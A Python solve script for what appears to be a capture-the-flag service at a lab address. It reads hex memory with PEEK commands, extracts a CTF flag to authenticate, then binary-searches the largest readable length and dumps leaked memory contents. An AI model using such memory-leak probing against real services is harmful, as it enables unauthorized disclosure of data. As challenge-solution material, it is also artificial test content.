import socket
import re

HOST_PORT = ("10.13.37.10", 20866)

def new_conn():
    s = socket.create_connection(HOST_PORT, timeout=10)
    s.settimeout(2)
    return s

def recv(s):
    buf = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf

s = new_conn()
recv(s)
s.sendall(b"PEEK 0 64\n")
r = recv(s).decode(errors='replace')
line = r.strip().splitlines()[-1]
data = bytes.fromhex(line[5:])
m = re.search(rb"CTF\{[^}]*\}", data)
auth1 = m.group(0).decode()
print("auth1:", auth1)
s.sendall(f"AUTH1 {auth1}\n".encode())
print(recv(s).decode(errors='replace').strip())

def peek(off, ln):
    s.sendall(f"PEEK {off} {ln}\n".encode())
    r = recv(s).decode(errors='replace').strip()
    return r

# binary search max valid length at offset 0
lo, hi = 64, 4096
while lo < hi:
    mid = (lo + hi + 1) // 2
    r = peek(0, mid)
    if r.startswith("DATA"):
        lo = mid
    else:
        hi = mid - 1
print("max valid length at offset 0:", lo)

r = peek(0, lo)
data = bytes.fromhex(r.split(" ", 1)[1])
for off in range(0, len(data), 16):
    chunk = data[off:off+16]
    if any(b != 0 for b in chunk):
        print(f"off={off:5d}: {chunk.hex()}  {chunk}")

s.close()
